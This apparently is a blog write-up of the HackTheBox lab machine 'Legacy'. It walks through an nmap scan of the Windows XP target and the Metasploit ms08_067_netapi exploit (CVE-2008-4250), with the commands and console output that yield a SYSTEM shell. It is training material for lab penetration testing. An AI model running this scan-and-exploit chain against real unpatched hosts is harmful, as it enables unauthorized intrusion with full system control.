---
layout: post
title:  "HackTheBox - Legacy Writeup"
categories: [HackTheBox]
tags: []
draft: false
---

# Introduction

This is a writeup for the machine "Legacy" (10.10.10.4) on the platform HackTheBox. HackTheBox is a pentetration testing labs platform so aspiring pen-testers & pen-testers can practice their hacking skills in a variety of different scenarios.

## Enumeration

### NMAP

The first thing we're going to do is run an NMAP scan using the following command `nmap -sV -sC -Pn -oX /tmp/webmap/legacy.xml 10.10.10.4` if you're wondering about the last flag `-oX` that is allowing me to output the report into an XML format, this is because I use webmap (as you can see in the /tmp/webmap) which is an awesome tool that allows me some visual aids for a box/network!

```
linxz@linxzsec:~/Documents/Hacking/HTB/Boxes/Retired/Legacy$ nmap -sC -sV -Pn -oX /tmp/webmap/legacy.xml 10.10.10.4

Starting Nmap 7.60 ( https://nmap.org ) at 2019-01-28 17:13 GMT
Nmap scan report for 10.10.10.4
Host is up (0.028s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d01h57m38s, deviation: 0s, median: 5d01h57m38s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:65:4d (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-02-02T21:11:16+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

As you can see in the above scan, it looks like we're rrunning Windows XP, as you will know, this is a very old OS so it is likely there are going to be some CVEs which are unpatched, very easy to explokt & very powerful. We know that SMB is running so let us do some google-fu for a SMB Windows XP vulnerability.

### SMB

As we mentioned, we know SMB is running and we're on Windows XP so it is highly likely there is a vulnerability we can exploit for the foothold here. The first thing that I searched was "windows xp smb exploit" and the very first result was CVE2008-4250 & a MSF module that we can use to exploit this. I did some basic research on this vulnerability as I wanted to exploit it manually for my own benefit however, it is a lot harder to exploit manually than I expected with a lot of steps/things that had to be done, so for the sake of this being a 20 point box I just used the Metasploit module.

## Exploitation

So, let's load MSF using `msfconsole` once it loads we need to use `msf5 > use exploit/windows/smb/ms08_067_netapi ` to select the exploit, that is the MS number however as mentioned earlier the CVE is CVE2008-4250. Once we've selected the exploit we now need to set the remote host, we can do this using `set RHOST 10.10.10.4` and that will set the host. That is all we need to configure, now you just need to run the exploit and we'll get a shell.

It is worth noting that this might not work without setting the target, in that case, we know that it is Windows XP but we don't know the service pack however, we can take a pretty good guess it is the English pack SP2 or SP3. You can use `show targets` to find a list of all the service packs, etc.

```
msf5 exploit(windows/smb/ms08_067_netapi) > set TARGET 7
TARGET => 7
msf5 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   7   Windows XP SP3 English (NX)


msf5 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > run
```

Once you run this you're going to get thrown into the `system32` folder as NT_Authority. That basically means, no privilege escalation is going to be required for us now, all we need to do is go and get the user & root flag. That is it!

Thanks for reading another writeup, more coming soon! 